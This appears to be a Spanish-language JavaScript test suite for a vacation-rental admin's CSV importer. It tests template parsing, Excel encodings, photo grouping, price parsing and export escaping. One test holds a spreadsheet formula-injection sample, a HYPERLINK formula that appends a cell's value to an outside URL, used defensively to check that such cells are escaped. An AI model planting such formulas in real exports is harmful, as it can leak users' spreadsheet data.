// Pruebas del importador (admin/js/importar.js) con la plantilla que se le manda al socio
// (docs/plantilla-casas-por-noche.csv): que la lea tal cual, guardada desde Google Sheets o desde Excel en español,
// y que las fotos descargadas de Google Drive (.zip con carpetas) caigan en su casa.
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { decodificarCsv, parseCsv, filasComoObjetos, filaAPropiedad, agruparFotos, parseNumero } from '../admin/js/importar.js';
import { textoCsv } from '../admin/js/formato.js';
import { OPERACIONES, ESTADOS_PROPIEDAD } from '../admin/js/estados.js';

let ok = 0;
const t = (nombre, fn) => { fn(); ok++; console.log('✓', nombre); };

const opciones = {
	operacion: OPERACIONES, estado: ESTADOS_PROPIEDAD.map((e) => [e.valor, e.label]),
	tipo: [['casa', 'Casa'], ['apartamento', 'Apartamento'], ['finca', 'Finca']], moneda: [['USD', 'Dólares (US$)'], ['GTQ', 'Quetzales (Q)']]
};
const duenos = [{ id: 'socio-1', nombre: 'Socio Uno', telefono: '+502 5555 0001' }];
const PLANTILLA = readFileSync(new URL('../docs/plantilla-casas-por-noche.csv', import.meta.url), 'utf8');
const leer = (buf) => filasComoObjetos(parseCsv(decodificarCsv(buf.buffer.slice(buf.byteOffset, buf.byteOffset + buf.length))));

t('La plantilla del socio: cada fila sale como casa por noche, con su dueño (por teléfono), precios y calendario', () => {
	const { filas, desconocidas } = leer(Buffer.from(PLANTILLA));
	assert.equal(filas.length, 2);
	assert.deepEqual(desconocidas, []);
	const r = filaAPropiedad(filas[0], { opciones, duenos });
	assert.deepEqual(r.errores, []);
	assert.equal(r.datos.operacion, 'vacacional');
	assert.equal(r.datos.propietarioId, 'socio-1');
	assert.equal(r.carpeta, 'casa-del-lago');
	assert.deepEqual(r.socio, { precioBase: 100, precioFinde: 130, icalUrl: 'https://www.airbnb.com/calendar/ical/XXXX.ics', icalBooking: 'https://admin.booking.com/hotel/hoteladmin/ical.html?t=XXXX' });
	assert.deepEqual(r.vac, { limpieza: 40, deposito: 150, nochesMin: 2, huespedesMax: 6 });
	assert.deepEqual(r.datos.amenidades, ['Piscina', 'Muelle', 'Wifi']);
});

t('Municipio del CSV: con el nombre de la tabla y su departamento; uno repetido va sin departamento; uno desconocido, tal cual', () => {
	const fila = (ciudad, zona = '') => filaAPropiedad({ titulo: 'Casa de prueba', ciudad, zona }, { opciones, duenos }).datos;
	assert.deepEqual([fila('antigua').ciudad, fila('antigua').departamento], ['Antigua Guatemala', 'Sacatepéquez']);
	assert.deepEqual([fila('Ciudad de Guatemala', '10').ciudad, fila('Ciudad de Guatemala', '10').departamento, fila('Ciudad de Guatemala', '10').zona], ['Guatemala', 'Guatemala', 'Zona 10']);
	assert.equal(fila('san miguel duenas').ciudad, 'San Miguel Dueñas');
	assert.deepEqual([fila('San José').ciudad, fila('San José').departamento], ['San José', undefined]);
	assert.deepEqual([fila('Narnia').ciudad, fila('Narnia').departamento], ['Narnia', undefined]);
});
t('Guardada desde Excel en español (punto y coma, acentos en Windows-1252): se lee igual', () => {
	const excel = PLANTILLA.replace('Casa frente al lago', 'Casa frente al lago Atitlán').split('\n')
		.map((l) => l.split(',').map((c) => (c.includes(';') ? `"${c}"` : c)).join(';')).join('\r\n'); // como lo guarda Excel
	const { filas } = leer(Buffer.from(excel, 'latin1'));
	assert.equal(filas.length, 2);
	assert.equal(filas[0].titulo, 'Casa frente al lago Atitlán en Panajachel');
	const r = filaAPropiedad(filas[0], { opciones, duenos });
	assert.equal(r.datos.propietarioId, 'socio-1');
	assert.deepEqual(r.datos.amenidades, ['Piscina', 'Muelle', 'Wifi']);
});

t('Fotos de Google Drive (.zip con dos carpetas envoltorio): cada carpeta va a su casa, aunque cambie el nombre en mayúsculas o espacios', () => {
	const Z = 'Fotos casas-20261116T1/Fotos casas';
	const fotos = [`${Z}/casa-del-lago/10.jpg`, `${Z}/Casa del Lago/2.JPG`, `${Z}/villa-monterrico/a.heic`, '__MACOSX/x/._a.jpg', `${Z}/otra-casa/1.jpg`]
		.map((ruta) => ({ ruta, tipo: '', tamano: 1 }));
	const g = agruparFotos(fotos, [{ claves: ['casa-del-lago', 'A-1'] }, { claves: ['villa-monterrico', 'A-2'] }]);
	assert.deepEqual(g.porFila.get(0).map((f) => f.ruta.split('/').pop()), ['2.JPG', '10.jpg']);
	assert.deepEqual(g.porFila.get(1).map((f) => f.ruta.split('/').pop()), ['a.heic']);
	assert.deepEqual(g.sinFila, [{ nombre: 'otra-casa', fotos: 1 }]);
	assert.equal(g.ignorados, 1);
});

t('Un CSV de antes con una sola columna «ical» sigue siendo el de Airbnb; un enlace sin https se avisa con su plataforma', () => {
	const { filas } = leer(Buffer.from('titulo,operacion,propietario,socio_noche,ical,ical_vrbo\nCasa,vacacional,+502 5555 0001,90,https://a.ics,http://v.ics\n'));
	const r = filaAPropiedad(filas[0], { opciones, duenos });
	assert.equal(r.socio.icalUrl, 'https://a.ics');
	assert.equal(r.socio.icalVrbo, undefined);
	assert.match(r.errores.join(' '), /VRBO \(ical_vrbo\)/);
});

t('Precios con el punto pegado a la moneda: «Q.5,000» es 5,000, no 5', () => {
	assert.equal(parseNumero('Q.5,000'), 5000);
	assert.equal(parseNumero('Q.350,000'), 350000);
	assert.equal(parseNumero('Q.2500'), 2500);
	assert.equal(parseNumero('Q. 1,250,000'), 1250000);
	assert.equal(parseNumero('US$.300'), 300);
	// Lo de siempre sigue igual.
	assert.equal(parseNumero('.5'), 0.5);
	assert.equal(parseNumero('Q 1,250,000'), 1250000);
	assert.equal(parseNumero('$350,000.50'), 350000.5);
	assert.equal(parseNumero('1.250,5'), 1250.5);
	assert.equal(parseNumero(''), null);
	assert.ok(Number.isNaN(parseNumero('mucho')));
});

t('CSV exportado: lo que empieza como fórmula va como texto (apóstrofo), y el importador lo lee como estaba', () => {
	const csv = textoCsv([['=HYPERLINK("https://x/?d="&B2,"Ver")', '+502 5555 0001', -5, '@hola'], ['\tx', '\rx', 0, 'normal "con comillas"']]);
	assert.equal(csv.split('\r\n')[0], `"'=HYPERLINK(""https://x/?d=""&B2,""Ver"")","'+502 5555 0001","-5","'@hola"`);
	assert.equal(csv.split('\r\n')[1], `"'\tx","'\rx","0","normal ""con comillas"""`);
	// Ida y vuelta: la plantilla y la exportación de propiedades se vuelven a importar sin el apóstrofo.
	const { filas } = filasComoObjetos(parseCsv('titulo,propietario,descripcion\r\n' + textoCsv([['Casa', '+502 5555 0001', '-sin vista']])));
	assert.equal(filas[0].propietario, '+502 5555 0001');
	assert.equal(filas[0].descripcion, '-sin vista');
	assert.equal(filaAPropiedad({ ...filas[0], operacion: 'vacacional' }, { opciones, duenos }).datos.propietarioId, 'socio-1');
});

console.log(`${ok} pruebas del importador pasan.`);
